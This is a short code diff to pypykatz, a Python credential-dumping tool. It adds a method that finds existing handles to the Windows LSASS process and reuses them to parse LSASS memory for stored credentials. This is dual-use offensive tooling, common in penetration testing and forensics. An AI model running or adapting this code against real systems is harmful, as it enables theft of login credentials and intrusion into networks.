@@ -89,7 +89,21 @@ class pypykatz:
 		mimi = pypykatz(reader.get_buffered_reader(), sysinfo)
 		mimi.start()
 		return mimi
-
+	
+	@staticmethod
+	def go_handledup():
+		if platform.system() != 'Windows':
+			raise Exception('Live parsing will only work on Windows')
+		from pypykatz.commons.winapi.local.function_defs.live_reader_ctypes import enum_lsass_handles
+		lsass_handles = enum_lsass_handles()
+		if len(lsass_handles) == 0:
+			raise Exception('No handles found to LSASS!')
+		for pid, lsass_handle in lsass_handles:
+			try:
+				return pypykatz.go_live_phandle(lsass_handle)
+			except Exception as e:
+				print('[-] Failed to parse lsass via handle %s[@%s] Reason: %s' % (pid, lsass_handle, e))
+			
 	@staticmethod
 	def go_live_phandle(lsass_process_handle):
 		if platform.system() != 'Windows':
